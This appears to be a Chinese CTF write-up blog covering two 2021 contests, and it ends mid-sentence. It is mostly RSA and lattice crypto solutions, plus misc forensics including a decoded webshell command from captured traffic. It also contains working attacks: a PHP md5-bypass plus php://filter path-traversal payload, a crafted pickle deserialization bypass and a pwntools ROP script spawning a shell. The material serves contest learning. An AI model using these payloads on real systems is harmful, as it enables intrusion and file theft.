403617490110959353085963322495483098493865964611448790100520199013314219751750640119863 $n_1=n_2$，RSA共模攻击。 1234567891011121314151617181920212223242526272829import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e1 = 835967807536519622934604405063c1 = 19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710e2 = 885003184250422219085124964981c2 = 4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:]))#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27; FLAG: flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125; ​ Base 31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d 先转hex得到 13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===， zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7=== 根据无数字1和等号特征，猜测是转小写的base32； 转回大写，由前面提示 13+5，rot13+base32得到 fladå.Ù..Å.Í.Õ.Á.ÌÅ....Èå.ÈäÝ...Õ..Éþ 出现flag头； 由于 base32(&#39;flag&#123;&#39;)=MZWGCZ33，数字为rot5，密文还原为 MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===， base32 解码得 flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;。 FLAG: flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125; ​ Flow 杂七杂八密码的混合体 123456789101112131415161718192021222324252627282930313233343536373839from Crypto.Util.number import *def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status=1mask = 0b10110001110010011100100010110101m = b&quot;flag&#123;*************&#125;&quot;num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537binp = bin(p)[2:]c = (pow(num, e, n))f=open(&quot;enc2&quot;, &quot;w+&quot;)f.write(str(n)+&quot;\\n&quot;)f.write(str(c)+&quot;\\n&quot;)f.close()f=open(&quot;enc&quot;,&quot;w+&quot;)for i in range(760): curnum = int(binp[i]) (status,out)=lfsr(status,mask) f.write(chr(curnum ^ out))f.close() LFSR + RSA高位p泄露攻击。 先模拟LFSR求出760组 out 01值，结合enc文件中01密文，异或还原 $p$ 的高760二进制位： 1234567891011121314151617181920212223242526def lfsr(status,mask): newbit = (status &lt;&lt; 1) &amp; (2**33-1) i=(status&amp;mask)&amp;(2**33-1) lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 newbit^=lastbit return (newbit,lastbit)status = 1mask = 0b10110001110010011100100010110101c = list(bytes.fromhex(&#x27;00000100000001010001010101010000000000010000010001010000010100000001000000000101010100010001000000000000010001000000010000000001010000000101000000000000000001000100010001000101010001010101010101000101000101000000010001010001000000000001010001010100010001000000000000010000010001000000000000000000000000010101000000010101000100010001000100010101010101010001010000000100000100000101000101010001010101000101000001010000010001000100000001000101010100010100010000000101000001000101000001000101000100010100000100000101000100000100000100000000010000010100010001010100010000000100000001000001010000000000000001010101000101010100010100010001010101000100010101000100010001010101010001010000000101010001000100000000000101000001010001000101000001000100010101010001000001010001010001010101010001000100010101000001000001000100010000000100000001010001010000000101010000010001000000010000010100000000010001000001010100010101010101000000010100010100010101000000010001010101010001010100000001010001000101000100000000000100010100000001010101000100010100010100010000000100010101000001000001010001000100010001010001000101010101000000000000010100000001000000000001010000010100000001000100000000000000000101010101000000000000010001000100010001000001000100000101000101000101010101010001000001000101000101000000010100000001010001000100010101000001000101010100010001010100010100010000000001000001010000000001010001000001010000010000000001000101000100010001010101010101000101010101000000000000000101010001010001010100010100000000000000000100010101&#x27;))#print(c)pp = &#x27;&#x27;for i in range(760): (status,out) = lfsr(status,mask) pp += str(c[i]^out)pp = int(pp, 2)print(pp)#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975 利用coppersmith攻击方法，进行已知 $p$ 高位攻击： 12345678910111213141516n = 20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301p4 = 6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007e = 65537pbits = 1024kbits = pbits - p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4+int(roots[0]) print(&quot;p = &quot;+str(p)) print(&quot;q = &quot;+str(n//p)) #p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389 最后常规RSA解 $m$： 123456789101112import gmpy2p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389n = p * qfn = (p-1) * (q-1)e = 65537c = 12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230d = gmpy2.invert(e, fn)m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27; FLAG: flag&#123;th1s_ls_4_eZ_quEST1on&#125; ​ NumberGame 数字的游戏 12345e=65537(p-1)*(q-1)=15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032c=13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763invert(p,q)=63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531invert(q,p)=61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 给出 $(p-1)(q-1),x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,c$。 详细推导思路可参考 HITCON 2019 - Lost Modulus Again。 解题脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;if l,s are correct: alpha = k * t beta = k * (p&#x27; - l) + t * (q&#x27; - l)i.e:&quot;&quot;&quot;def alpha_from_pprime_qprime_l(pprime, qprime, l): return pprime*qprime - ldef beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha): temp1 = e*d - 1 assert temp1 % s == 0 temp2 = ((temp1 // s) - 1) * l * l temp3 = temp2 + l * (pprime + qprime) return temp3 - alpha - (pprime*qprime)def k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta): a = pprime - l b = -beta c = alpha * (qprime - l) disc = b * b - 4 * a * c assert gmpy2.is_square(disc) temp = -b + gmpy2.isqrt(disc) assert temp % (2*a) == 0 k = temp // (2*a) assert alpha % k == 0 return k, alpha // kdef brute_k_t_l(pprime, qprime, e, d): # l, s = 2, 2 ss = [s for s in range(e - 100000, e + 1000000) if s!=0 and (e*d - 1) % s == 0] for l, s in product(range(1, 5000), ss): #print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;) try: alpha = alpha_from_pprime_qprime_l(pprime, qprime, l) beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha) k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta) return k, t, l except AssertionError: continueif __name__ == &quot;__main__&quot;: e = 65537 fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032 d = gmpy2.invert(e,fn) pprime = 63567214271914333094632899333841375147292062018298573854142802911053572390920700513290025348818998146731407276513819782906243535938082361025317768375133584131695102997533625569063205757115454077033715745425720243515047860316309615090852448819151555625882308478246810599114349379924606314715907857949899701531 qprime = 61854206698188431209560015384356189028981002413118973294450748821388080621667741484068895416821294105003859720045449073339567340407545907381482535347338180766054184558875014806879520058753821268699806496142714025634827191809185242495912563928024605815219672974396270176683304596115075405856328836048144151507 k, t, l = brute_k_t_l(pprime, qprime, e, d) lp, lq = qprime + k, pprime + t assert lp % l == 0, lq % l == 0 p, q = lp // l, lq // l assert gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime assert gmpy2.is_prime(p), gmpy2.is_prime(q) N = p*q c = 13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763 flag_decoded = pow(c, d, N) print(long_to_bytes(flag_decoded)) #b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27; FLAG: flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125; ​ FillTheBlank 推公式？ 123456789101112131415161718192021from Crypto.Util.number import *import gmpy2import matha = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723b = &quot;**********&quot;d = 1004034638166310792730607806775703553124564601554345421260673flag=&quot;flag&#123;*************&#125;&quot;.encode(&quot;utf-8&quot;)m = bytes_to_long(flag)z = &quot;**********&quot;rb = gmpy2.invert(b, p) #p应为ard = gmpy2.invert(d, p) #p应为ax = rb*rdc = (m + z * rb * d % a)%aassert(x==6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478)assert(c == 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129)assert(log(d)/log(2)&lt;=200)assert(log(z)/log(2)&lt;=1024) 推导： 由 $rb \\equiv b^{-1} \\pmod a$ 和 $rd \\equiv d^{-1} \\pmod a$ ，有 $rb \\cdot b \\cdot rd \\cdot d = x \\cdot b \\cdot d \\equiv 1 \\pmod a$。 故求出 $b \\equiv (x \\cdot d)^{-1} \\pmod a$，$rb \\equiv b^{-1} \\pmod a$。 又 $c = (m+z \\cdot rb \\cdot d) \\bmod a$，构造格 $L=\\begin{bmatrix} 1 &amp; rb \\cdot d \\\\ 0 &amp; a \\end{bmatrix}$，利用LLL算法求解： 123456789101112131415161718192021222324252627a = 16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723d = 1004034638166310792730607806775703553124564601554345421260673x = 6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478c = 13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129import gmpy2b = gmpy2.invert(x*d,a)rb = gmpy2.invert(b,a)rd = gmpy2.invert(d,a)h = rb*d%ap = av1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);f, g = m.LLL()[0]f, g = -f, -g#print(f, g)a = f*c % p % gm = a * inverse_mod(f, g) % gprint(bytes.fromhex(hex(m)[2:]))#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27; FLAG: flag&#123;we1c0mE_t0_cr4aK_mE!&#125; ​ MISCcheckin flag{W3Lc0m3_t0_2o2I_3n3rgy_contest} 签到。 FLAG: flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125; ​ hardwire_1 下载附件压缩包，分析文件，找到flag。提交flag格式：flag{xxxx}。 流量包文件，wireshark打开，追踪TCP流，发现菜刀连接流量特征。 解析流1中z2参数值，base64解码得： cd /d &quot;C:\\php\\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E] 解析流3中z0参数值，base64解码转存得到Rar文件 key.rar。 结合前面的解压密码 f@l#ag102，解压得到 flag.jpg。 FLAG: flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125; ​ wava Do you know what is wava? 附件move.zip无法打开，010editor查看为wav文件头，修改后缀，使用audacity打开未发现有用信息。 回到16进制下查看，发现在0x69处存在另一个wav文件头，删除前面的文件头保存，重新使用audacity打开，发现摩斯密码，手撸下来得到： ..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. ----- 解码得flag。 FLAG: flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125; ​ WEBezphp 想看二次元有很多障碍(flag在/flag) 点提交按钮出现源码： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php if(!$_GET[&#x27;site&#x27;])&#123; ?&gt;&lt;html&gt; &lt;body&gt; 想看个二次元怎么这么难&lt;form action=&#x27;&#x27; method=&#x27;GET&#x27;&gt; &lt;input type=&#x27;submit&#x27; name=&#x27;submit&#x27; /&gt; &lt;input type=&#x27;text&#x27; name=&#x27;site&#x27; style=&quot;width:1000px&quot; value=&quot;https://bilibili.com/&quot;/&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; &lt;?php die(); &#125;show_source(__FILE__);if (($_GET[&#x27;user&#x27;]===$_GET[&#x27;password&#x27;])||(md5($_GET[&#x27;user&#x27;])!=md5($_GET[&#x27;password&#x27;]))) die();$url = $_GET[&#x27;site&#x27;]; $path = $_GET[&#x27;path&#x27;];$url_schema = parse_url($url); $host = $url_schema[&#x27;host&#x27;]; $request_url = $url.&quot;/v/popular/all&quot;.$path; $res = file_get_contents($request_url);if (strstr($res,&quot;flag&quot;)) die(&quot;you can&#x27;t see my flag&quot;);if($res)&#123; echo &quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;; echo $request_url; echo &quot;&lt;hr /&gt;&quot;; echo $res; &#125;else&#123; echo &quot;get source failed&quot;; &#125; ?&gt; 第一层，PHP md5弱比较性质绕过：user[]=1&amp;password[]=2 第二层，PHP伪协议拼接绕过关键词+目录穿越：site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag payload: ?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2 得到ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K，base64解码得flag。 FLAG: flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125; ​ EZpy pickle反序列化 加参数 ?source=1 得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import base64import ioimport sysimport pickleimport bfrom flask import Flask, Response, render_template, requestapp = Flask(__name__)def read(filename, encoding=&#x27;utf-8&#x27;): with open(filename, &#x27;r&#x27;, encoding=encoding) as fin: return fin.read()class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; #==判断 def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.ageclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module[0:8] == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def here_load(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def index(): if request.args.get(&#x27;source&#x27;): return Response(read(__file__),mimetype=&#x27;text/plain&#x27;) else: return Response(&quot;/?source=&quot;)@app.route(&#x27;/app&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def inll(): if request.method == &#x27;POST&#x27;: try: pickle_data = request.form.get(&#x27;data&#x27;) if b&#x27;R&#x27; in base64.b64decode(pickle_data): return &#x27;no no no&#x27; else: result = here_load(base64.b64decode(pickle_data)) if type(result) is not people: return &#x27;？？？？&#x27; correct = (result == people(b.name, b.sex, b.age)) if correct: return Response(read(&#x27;/flag.txt&#x27;)) except Exception as e: return Response(str(e)) test = people(&#x27;test&#x27;, &#x27;test&#x27;,&#x27;55&#x27;) pickle_data = base64.b64encode(pickle.dumps(test)).decode() return Response(pickle_data)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8000) 限制中，改写了find_class函数，只能生成__main__模块的pickle，此外，禁止了b&#39;R&#39;。 目标是覆盖 b 中的验证，由于 b 被主程序引入，是存在于__main__下的 b 模块中的，所以可以直接覆盖掉，此时就成功绕过了限制： 12345678910111213141516171819202122232425262728293031323334import ioimport sysimport pickleimport base64class people: def __init__(self, name, sex, age): self.name = name self.sex = sex self.age=age def __repr__(self): return f&#x27;people(name=&#123;self.name!r&#125;, category=&#123;self.sex!r&#125;, age=&#123;self.age!r&#125;)&#x27; def __eq__(self, other): return type(other) is people and self.name == other.name and self.sex == other.sex and self.age==other.age #print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))data=b&#x27;&#x27;&#x27;c__main__b(S&#x27;name&#x27;S&quot;aaa&quot;S&quot;sex&quot;S&quot;bbb&quot;S&quot;age&quot;S&quot;ccc&quot;db0(S&quot;aaa&quot;S&quot;bbb&quot;S&quot;ccc&quot;i__main__people.&#x27;&#x27;&#x27;print(base64.b64encode(data).decode())#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou POST方式在 /app 路由传入参数 data，得到flag。 FLAG: flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021羊城杯网络安全大赛","slug":"match-2021羊城杯网络安全大赛","date":"2021-09-11T17:14:50.000Z","updated":"2021-09-11T19:04:16.364Z","comments":true,"path":"2021/09/12/match-2021羊城杯网络安全大赛/","link":"","permalink":"https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。 大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。 Rank: 企事业单位组12 ReverseEz_android Just an easy sign in! jadx查看MainActivity类。 onClink函数先验证username和password，在资源文件查到username为admin，加密处理后的password值为c232666f1410b3f5010dc51cec341f58，又getEncodeStr函数对password的md5结果每一byte做了减1处理，还原得到c33367701511b4f6020ec61ded352059，查到对应的原值为654321。 接下来执行getKeyAndRedirect函数，传入password值654321，进入socket交互（nc 139.224.191.201 20080），输入password，拿到key字符串： key=TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom 在getKeyAndRedirect函数中最后将key传递到CheckFlagActivity，在CheckFlagActivity中checkFlag函数调用EncodeUtils类实现base64编码，key为码表，encodeFlag为编码结果： encodeFlag=3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P 跑更换码表base64解码算法还原flag：SangFor{212f4548-03d1-11ec-ab68-00155db3a27e} ​ PWNBabyRop有system函数和/cin/sh，简单ROP，缺少的/bin/sh\\x00可以用sh\\x00代替。 12345678910111213141516171819#coding:utf-8from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&#x27;192.168.42.14&#x27;, 11000)elf = ELF(&#x27;./BabyRop&#x27;)sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)sh_addr = 0x0804c029system_addr = 0x80490a0pay = &#x27;A&#x27; * (0x28 + 4) + p32(system_addr) + p32(0) + p32(sh_addr)pause()sl(pay)p.interactive() ​ CryptoRingRingRing ring a ring a ring ring a ring a ring nc测试md5-PoW之后，需要输入100组a,b,c,d,e，使得 $a^4+b^4+c^4+d^4=e^2$，且都不能为0。 构造 $1^4+1^4+1^4+1^4=2^2$，再按倍数做乘积 $k^4+k^4+k^4+k^4=(2k^2)^2,k \\in [1,100]$，得到100组用例。 123456789101112131415161718192021222324from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import md5def brute_force(prefix,s): return bruteforce(lambda x:md5(x+prefix).hexdigest()[0:5]==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)r=remote(&#x27;192.168.42.14&#x27;,2378)prefix, s = parse(&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;,r.recvline())r.sendlineafter(&#x27;[&gt;] Give me xxxxx: &#x27;,brute_force(prefix,s))r.recvline()r.recvline()for i in range(1,101): r.sendlineafter(&#x27;[&gt;] a: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] b: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] c: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] d: &#x27;,str(i)) r.sendlineafter(&#x27;[&gt;] e: &#x27;,str(2*i*i)) print(r.recvline())print(r.recvline())#GWHT&#123;a_funny_equation&#125; ​ Easy_Rsa 你了解RSA吗??? 12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from flag import flagimport gmpy2def gen_prime(nbits, gamma): g = getPrime(int(nbits * gamma)) alpha = 0.5 - gamma while True: a = getRandomNBitInteger(int(alpha * nbits)) p = 2 * g * a + 1 if isPrime(p): b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 h = 2 * g * a * b + a + b while not isPrime(q) or isPrime(h) or gmpy2.gcd(a, b) != 1: b = getRandomNBitInteger(int(alpha * nbits)) q = 2 * g * b + 1 return p, qdef encrypt(nbits, gamma): p, q = gen_prime(nbits, gamma) n = p * q e = getPrime(16) while gmpy2.gcd(e, gmpy2.lcm(p-1,q-1)) != 1: e = getPrime(16) m = bytes_to_long(flag) c = pow(m, e, n) return n, e, cn, e, c = encrypt(1024, 0.48)print &#x27;n =&#x27;, nprint &#x27;e =&#x27;, eprint &#x27;c =&#x27;, c# n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039# e = 58337# c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668 共素数攻击（common prime RSA）。 给出 